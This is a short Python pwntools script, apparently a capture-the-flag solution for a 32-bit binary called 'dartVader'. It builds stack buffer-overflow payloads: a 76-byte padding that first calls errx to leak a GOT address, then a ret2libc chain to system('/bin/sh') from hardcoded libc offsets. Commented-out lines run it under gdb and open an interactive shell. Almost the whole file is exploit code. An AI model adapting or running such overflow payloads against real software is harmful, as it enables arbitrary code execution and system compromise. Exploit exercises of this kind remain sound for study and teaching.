from pwn import *
#sh = process("./dartVader",env = {"LD_PRELOAD":"./ld-2.19.so"})
context.log_level = "debug"
elf = ELF("./dartVader")
errx_addr = elf.plt['errx']
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#gdb.attach(sh)

#paddding = "a" * 76 + p32(errx_addr)
paddding = flat(["a"*76, errx_addr, 0xfffffffe, 0x12345699,elf.got['errx']])
#paddding = flat(["a"*76, errx_addr, 0x12345699,0xffffffff,0x08048522])
print(repr(paddding))
print("==")
libc_base = 0xf7e1c540 
libc_errx_base = 0xb76e6da0

print(libc.symbols)

system_addr = libc_errx_base -0xaaa90
sh_addr = libc_errx_base + 0x77fac



paddding = flat(["a"*76, system_addr, 0xdeadbeef,sh_addr])

print(repr(paddding))

#system_addr = 0xf7e1c540 + 0x22860
#sh_addr = 0xf7e1c540 + 0x1434cb
paddding = flat(["a"*76, system_addr,0xdeadbeef, sh_addr])

print(repr(paddding))
'''
sh = process(["./dartVader",paddding],env = {"LD_PRELOAD":"./ld-2.19.so"})
gdb.attach(sh,"b *0x08048483")
sh.interactive()



#0x08048340
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
'''
